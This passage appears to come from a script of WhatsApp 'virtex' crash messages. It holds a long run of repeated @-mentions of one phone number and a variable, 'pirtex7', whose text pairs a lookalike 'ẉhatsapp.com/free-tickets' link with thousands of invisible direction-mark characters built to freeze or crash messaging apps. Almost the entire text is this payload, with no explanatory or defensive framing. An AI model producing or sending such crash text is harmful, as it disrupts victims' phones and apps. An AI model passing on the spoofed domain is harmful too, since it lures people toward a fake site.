*~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~* *~@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩@⁨+62 895-2953-8385⁩~*'
				pirtex7 = '𝐁𝐲 hyper https://www.instagram.com/p/CE4gAv2BwOc/?igshid=1m178y0r4l8ya ẉhatsapp.com/free-tickets 🔥‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏